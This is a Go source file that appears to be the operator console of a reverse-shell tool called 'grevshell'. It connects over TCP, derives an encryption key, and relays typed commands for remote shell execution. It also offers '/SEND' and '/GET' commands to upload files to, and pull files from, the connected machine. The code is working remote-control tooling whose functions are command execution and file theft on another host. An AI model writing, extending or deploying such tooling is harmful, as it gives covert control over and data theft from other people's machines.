package main 

import (
	"log/slog"
	"fmt"
	"bufio"
	"os"
	"strings"
	"path/filepath"
	"net"

	"grevshell/grevcore"
)

func main() {
	stream, err := net.Dial("tcp", "localhost:9999")

	if err != nil {
		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
		return
	}

	defer stream.Close()

	for {
		slog.Info(fmt.Sprintf("Connecting to %s.", stream.RemoteAddr()))
		key, err := grevcore.DeriveKey(stream)

		if err != nil {
			slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
			return
		}

		ProcessLoop(stream, key)
	}
}

func ProcessLoop(c net.Conn, key []byte) {
	send := bufio.NewReader(os.Stdin)
	defer c.Close()

	for {
		fmt.Printf("%s - $ ", c.RemoteAddr())
		line, err := send.ReadString('\n')

		if err != nil {
			slog.Error("An error occured while reading the command.", slog.Any("ERROR", err))
			continue
		}

		fields := strings.Fields(line)

		if len(fields) == 0 {
			continue
		}

		switch fields[0] {
		case "/SEND":
			filename := fields[1]

			data, err	:= os.ReadFile(filename)

			if err != nil {
				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				break;
			}
			toSend := make([]byte, len(data) + 8 + 32)

			copy(toSend[:8], []byte(grevcore.FILERECEIVE_HEADER))
			copy(toSend[8:40], []byte(filename))
			copy(toSend[40:], data)

			grevcore.SendPacket(c, &toSend, &key)
			break;

		case "/GET":
			filename := fields[1]
			toSend := make([]byte, 8 + 32)

			copy(toSend[:8], []byte(grevcore.FILESEND_HEADER))
			copy(toSend[8:], []byte(filename))

			grevcore.SendPacket(c, &toSend, &key)
			data := grevcore.ReceivePacket(c, &key)

			err := os.WriteFile(filepath.Base(filename), data[32:], 0600)

			if err != nil {
				slog.Error("An error occured while writing file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
				break;
			}

			break;
		default:
			lineByte := []byte(line)
			toSend := make([]byte, 8 + len(lineByte))

			copy(toSend[:8], []byte(grevcore.SHELLEXEC_HEADER))
			copy(toSend[8:], lineByte)

			grevcore.SendPacket(c, &toSend, &key)

			resp := string(grevcore.ReceivePacket(c, &key))

			fmt.Println(strings.TrimSpace(resp))
		}
	}
}
